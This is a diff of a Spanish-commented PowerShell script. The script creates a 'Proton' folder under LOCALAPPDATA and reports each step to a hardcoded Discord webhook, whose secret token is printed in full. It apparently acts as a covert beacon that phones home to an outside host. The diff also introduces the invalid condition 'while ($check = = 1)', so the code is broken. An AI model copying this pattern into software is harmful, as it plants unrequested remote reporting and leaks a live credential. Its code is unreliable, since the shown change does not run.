@@ -1,4 +1,4 @@
-$check = $true
+$check = 1
 function reporte {
     try {
         $webhook = "https://discord.com/api/webhooks/1345942563156393994/BDkrnul-xcAlgRjHjROWTfB17ZS7HSKvtXeaFWESO-NJQfc4JAfjPb-KO2ZXRQWIM9nX"
@@ -19,7 +19,7 @@ function reporte {
     }
 }
 
-while ($check) {
+while ($check = = 1) {
     try {
         # Define la ruta principal
         $root = Join-Path -Path $env:LOCALAPPDATA -ChildPath "Proton"
@@ -28,7 +28,8 @@ while ($check) {
         if (-not (Test-Path $root)) {
             New-Item -Path $root -ItemType Directory
             reporte "Se creó la carpeta en $root"
-        } else {
+        }
+        else {
             reporte "La carpeta ya existe en $root"
         }
     }
